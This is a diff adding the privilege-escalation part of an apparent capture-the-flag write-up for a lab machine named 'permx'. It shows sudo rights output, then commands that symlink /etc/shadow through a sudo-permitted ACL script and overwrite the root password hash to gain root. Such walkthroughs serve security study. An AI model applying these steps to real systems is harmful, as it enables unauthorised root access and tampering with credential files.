@@ -58,3 +58,33 @@ $_configuration['db_manager_enabled'] = false;
 
 I tried the password with user mtz on SSH and BAAAM! The `user.txt` file was in the `/home/mtz` folder.
 
+
+logged on mtz, i just used  `sudo -l` and saw that i have sudo permission for file `/opt/acl.sh`
+
+```
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+reading the acl.sh file i conclude that we can just bypass the setfacl command using a `target` with a symbolic link
+i tryied  first with root.txt file, but no success
+
+```
+# didnt work
+ln -s /root /home/mtz/root_link
+sudo /opt/acl.sh mtz rw /home/mtz/root_link/root.txt
+```
+
+so i tried with /etc/shadow to get the password
+```
+# works fine - shadow file is with read and write permissions for mtz user
+ln -s /etc/shadow /home/mtz/shadow
+sudo /opt/acl.sh mtz rw /home/mtz/shadow
+```
+
+Now i just edit the `/etc/shadow` file and used the same password that mtz for root.
+Then i used `su` with the mtz password and it works
+
